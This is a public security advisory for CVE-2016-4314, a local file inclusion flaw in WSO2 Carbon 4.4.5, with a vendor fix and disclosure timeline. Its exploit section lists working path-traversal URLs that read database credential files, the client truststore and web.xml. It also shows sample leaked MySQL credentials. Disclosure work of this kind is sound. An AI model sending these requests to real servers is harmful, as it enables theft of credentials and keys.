@@ -1,0 +1,120 @@
+[+] Credits: John Page aka HYP3RLINX
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/WSO2-CARBON-v4.4.5-LOCAL-FILE-INCLUSION.txt
+
+[+] ISR: ApparitionSec
+
+
+Vendor:
+===============
+www.wso2.com
+
+
+Product:
+====================
+Ws02Carbon v4.4.5
+
+WSO2 Carbon is the core platform on which WSO2 middleware products are
+built. It is based on Java OSGi technology, which allows
+components to be dynamically installed, started, stopped, updated, and
+uninstalled, and it eliminates component version conflicts.
+In Carbon, this capability translates into a solid core of common
+middleware enterprise components, including clustering, security,
+logging, and monitoring, plus the ability to add components for specific
+features needed to solve a specific enterprise scenario.
+
+
+Vulnerability Type:
+=========================
+Local File Inclusion (LFI)
+
+
+CVE Reference:
+==============
+CVE-2016-4314
+
+
+Vulnerability Details:
+=====================
+
+An authenticated user can download configuration files in the filesystem
+via downloadArchivedLogFiles operation in LogViewer admin service.
+The request to the admin service accepts a file path relative to the carbon
+log file directory (i.e. <WSO2_PRODUCT_HOME>/repository/logs)
+hence can access any file in the file system.
+
+
+References:
+https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2016-0098
+
+
+Example: accessing the registry.xml file via Local File Inclusion exposes
+the MySQL passwords.
+
+<currentDBConfig>mysql-db</currentDBConfig>
+<dbConfig name="mysql-db">
+<url>jdbc:mysql://localhost:3306/regdb</url>
+<userName>regadmin</userName>
+<password>regadmin</password>
+<driverName>com.mysql.jdbc.Driver</driverName>
+<maxActive>80</maxActive>
+<maxWait>6000</maxWait>
+<minIdle>5</minIdle>
+</dbConfig>
+
+
+
+Exploit code(s):
+===============
+
+LFI to read Database creds, truststore key file, web.xml etc...
+
+1) Read MySQL creds
+https://localhost:9443/carbon/log-view/downloadgz-ajaxprocessor.jsp?logFile=../../repository/conf/registry.xml&tenantDomain=&serviceName=
+
+2) Read MySQL creds
+https://localhost:9443/carbon/log-view/downloadgz-ajaxprocessor.jsp?logFile=../../repository/conf/datasources/master-datasources.xml
+
+3) Access Truststore Key file.
+https://localhost:9443/carbon/log-view/downloadgz-ajaxprocessor.jsp?logFile=../../repository/resources/security/client-truststore.jks
+
+
+4) Read web.xml
+https://localhost:9443/carbon/log-view/downloadgz-ajaxprocessor.jsp?logFile=../../repository/conf/tomcat/carbon/WEB-INF/web.xml
+
+
+Disclosure Timeline:
+===========================================
+Vendor Notification: May 6, 2016
+Vendor Acknowledgement: May 6, 2016
+Vendor Fix / Customer Alerts: June 30, 2016
+August 12, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+Severity Level:
+===============
+High
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
